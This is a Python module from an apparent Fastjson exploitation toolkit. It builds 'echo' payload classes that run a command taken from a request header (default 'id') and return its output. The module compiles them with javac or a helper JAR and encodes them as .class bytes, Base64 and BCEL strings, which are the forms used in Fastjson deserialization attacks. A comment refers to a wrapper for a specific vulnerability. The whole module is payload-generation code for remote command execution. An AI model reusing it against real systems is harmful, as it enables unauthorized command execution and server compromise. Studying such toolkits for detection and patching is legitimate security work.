"""编译回显类 → .class / Base64 / BCEL / JAR。

默认委托 echo-gen.jar；保留 compile_java_source 供投递适配 / 16723 包装。
"""

from __future__ import annotations

import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Optional

from fastjson_toolkit.poc.echo.client import EchoArtifact, generate_echo
from fastjson_toolkit.poc.echo.source import (
    DEFAULT_CLASS_NAME,
    DEFAULT_CMD_HEADER,
)


def _which_javac() -> str:
    path = shutil.which("javac")
    if not path:
        raise RuntimeError("未找到 javac，请安装 JDK 并加入 PATH")
    return path


def compile_java_source(
    src_text: str,
    class_name: str,
    *,
    classpath: str = "",
    out_dir: Optional[Path] = None,
) -> bytes:
    """javac 编译单个顶层类，返回 .class 字节。"""
    javac = _which_javac()
    cleanup = False
    if out_dir is None:
        tmp = tempfile.mkdtemp(prefix="fj-echo-")
        out_dir = Path(tmp)
        cleanup = True
    try:
        out_dir.mkdir(parents=True, exist_ok=True)
        src_path = out_dir / f"{class_name}.java"
        src_path.write_text(src_text, encoding="utf-8")
        cmd = [
            javac,
            "-encoding",
            "UTF-8",
            "-source",
            "8",
            "-target",
            "8",
        ]
        if classpath:
            cmd.extend(["-cp", classpath])
        cmd.extend(["-d", str(out_dir), str(src_path)])
        proc = subprocess.run(cmd, capture_output=True)
        if proc.returncode != 0:
            err = (proc.stderr or proc.stdout or b"").decode("utf-8", errors="replace")
            raise RuntimeError(f"javac failed for {class_name}:\n{err}")
        matches = list(out_dir.rglob(f"{class_name}.class"))
        if not matches:
            raise RuntimeError(f"missing compiled class: {class_name}")
        return matches[0].read_bytes()
    finally:
        if cleanup:
            shutil.rmtree(out_dir, ignore_errors=True)


def build_echo_artifact(
    *,
    engine: str = "auto",
    cmd_header: str = DEFAULT_CMD_HEADER,
    default_cmd: str = "id",
    class_name: str = DEFAULT_CLASS_NAME,
    proof_path: Optional[str] = None,
    banner: str = "FJ-ECHO",
    package: Optional[str] = None,
    extra_imports: Optional[list[str]] = None,
    class_annotations: Optional[list[str]] = None,
    implements: Optional[list[str]] = None,
    extra_class_body: str = "",
    trigger_static: bool = True,
    classpath: str = "",
) -> EchoArtifact:
    """生成回显类。

    默认走 echo-gen.jar。若调用方需要 @JSONType 等源码级定制
    （extra_imports / class_annotations / proof_path 等），回退到 Python 源码 + javac。
    """
    needs_custom_source = bool(
        proof_path
        or package
        or extra_imports
        or class_annotations
        or implements
        or extra_class_body
        or not trigger_static
        or classpath
    )
    if not needs_custom_source:
        return generate_echo(
            engine=engine,
            cmd_header=cmd_header,
            class_name=class_name,
        )

    # 16723 / 特殊包装：保留源码生成路径
    import base64

    from fastjson_toolkit.poc.echo.source import build_echo_java_source
    from fastjson_toolkit.poc.bytecode.encode import bcel_code_from_class_bytes

    src = build_echo_java_source(
        class_name=class_name,
        engine=engine,
        cmd_header=cmd_header,
        default_cmd=default_cmd,
        proof_path=proof_path,
        banner=banner,
        package=package,
        extra_imports=extra_imports,
        class_annotations=class_annotations,
        implements=implements,
        extra_class_body=extra_class_body,
        trigger_static=trigger_static,
    )
    raw = compile_java_source(src, class_name, classpath=classpath)
    if not raw.startswith(b"\xca\xfe\xba\xbe"):
        raise RuntimeError("编译产物不是合法 .class")
    b64 = base64.b64encode(raw).decode("ascii")
    return EchoArtifact(
        class_name=class_name,
        class_bytes=raw,
        class_b64=b64,
        bcel_code=bcel_code_from_class_bytes(raw),
        cmd_header=cmd_header,
        engine=engine,
        source=src,
    )
